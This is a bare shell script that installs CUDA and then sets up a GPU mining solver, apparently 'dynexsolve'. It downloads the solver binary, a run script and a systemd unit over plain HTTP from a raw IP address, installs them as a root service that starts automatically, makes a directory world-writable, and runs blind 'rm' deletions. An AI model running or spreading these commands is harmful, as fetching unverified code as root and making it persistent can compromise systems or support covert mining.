sudo rm -rf run
rm *
sudo mkdir /runss
sudo chmod 777 /runss
wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2004/x86_64/cuda-ubuntu2004.pin
sudo mv cuda-ubuntu2004.pin /etc/apt/preferences.d/cuda-repository-pin-600
wget https://developer.download.nvidia.com/compute/cuda/11.8.0/local_installers/cuda-repo-ubuntu2004-11-8-local_11.8.0-520.61.05-1_amd64.deb
sudo dpkg -i cuda-repo-ubuntu2004-11-8-local_11.8.0-520.61.05-1_amd64.deb
sudo cp /var/cuda-repo-ubuntu2004-11-8-local/cuda-*-keyring.gpg /usr/share/keyrings/
sudo apt-get update
sudo apt-get -y install cuda
sudo apt-get install -y libcurl4-nss-dev
cd /runss
wget http://139.59.106.85/khang/dynexsolve -P /runss 
wget http://139.59.106.85/khang/run.sh -P /runss
wget http://139.59.106.85/khang/dssd.service -P /runss
chmod 777 /runss/dynexsolve
sudo cp /runss/dynexsolve /usr/bin/
chmod +x /runss/run.sh
sudo cp /runss/dssd.service /etc/systemd/system/dssd.service
sudo systemctl enable dssd.service
sudo systemctl start dssd.service



